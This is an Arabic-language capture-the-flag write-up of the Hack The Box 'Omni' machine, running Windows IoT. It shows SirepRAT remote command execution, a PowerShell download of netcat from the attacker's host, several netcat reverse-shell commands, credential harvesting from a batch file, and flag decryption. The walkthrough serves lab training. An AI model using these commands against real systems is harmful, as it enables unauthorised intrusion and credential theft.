Created by fasto

My profile : https://www.hackthebox.eu/home/users/profile/


![Desktop View](/img/omn/O.jpeg)



 السلام عليكم  

> *Sammmry:*

   
iot  بعد جمع المعلومات نجد ان الماشين 

 sirepart نقوم ياستغلالها ب rce نقوم بالبحث في جوجل نجد 

من خلاله نجد كلمات سر نقوم باستعمالها للحصول على صلاحيات يوزر

administratorثم صلاحيات  


عبر windows device portal 


- 1 Recon
   - 1.1 Nmap
   - 1.2 Port
- 2 sireprat
- 3 user
   - 3.1 creeds
   - 3.2 User shell
   - 3.3 User flag
- 4 Administrator
   - 4.1 Administrator shell
   - 4.2 Root flag

## 1 Recon

### 1.1 Nmap

```
nmap نبدا بفحص البورتات باستخدام
```
![Desktop View](/img/omn/1.png)

نجد بورت 80 مفتوح

### 1.2 Port

port نقوم بتصفح

![Desktop View](/img/omn/2.png)

 windows divice portal عند فتح السيرفر نلاحظ

iot server نبحث عنها في جوجل  نجد انها عبارة عن

  rce ونجد انها مصابة ب
 

![Desktop View](/img/omn/3.png)

## 2 sireprat
                              من هناsireprat نحمل 
     https://github.com/SafeBreach-Labs/SirepRAT



Python server على جهازنا ونشعل netcat نقوم بتحميل

```
Python -m SimpleHTTPServe 80

```

serverعلى nc.exe نقوم برفع

![Desktop View](/img/omn/4.png)

```
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.14.212:8000/nc64.exe" --v
```

نقوم بالاستغلال باستخدام الامر التالي

```
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -e cmd 10.10.14.212 1234" --v 
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```

![Desktop View](/img/omn/5.png)

![Desktop View](/img/omn/6.png)

## 3 user

### 3.1 creeds
بعد عملية البحث داخل السيرفر نجد كلمات سر في المسار 

c:\Program Files\WindowsPowershell\Modules\PackageManagement

في ملف
r.bat

![Desktop View](/img/omn/7.png)

نسخدم هذه المعطيات لدخول الى 

http://10.10.10.204/8080

![Desktop View](/img/omn/8.png)

Processes>RunCommandنذهب الى



![Desktop View](/img/omn/9.png)

### 3.2 User shell

nc نقوم بالاتصال بجهازنا عبر 

```
C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -e cmd 10.10.14.212 4444
```

الخاص بك ip غير 10.10.14.212 ب 

![Desktop View](/img/omn/10.png)

### 3.3 User flag

ب user flag  نسحب

```
$credential = Import-CliXml -Path U:\Users\app\user.txt
$credential.GetNetworkCredential().Password 
```

![Desktop View](/img/omn/11.png)

## 4 Administrator

نقوم مرة اخرى بالدخول باستتخدام كلمة سر 

administrator

```
C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -e cmd 10.10.14.212 5555
```
### 4.1 Administrator shell



![Desktop View](/img/omn/12.png)


### 4.2 Root flag

ب flag نسحب

```
$credential = Import-CliXml -Path U:\Users\administrator\root.txt
$credential.GetNetworkCredential().Password
```

![Desktop View](/img/omn/13.png)


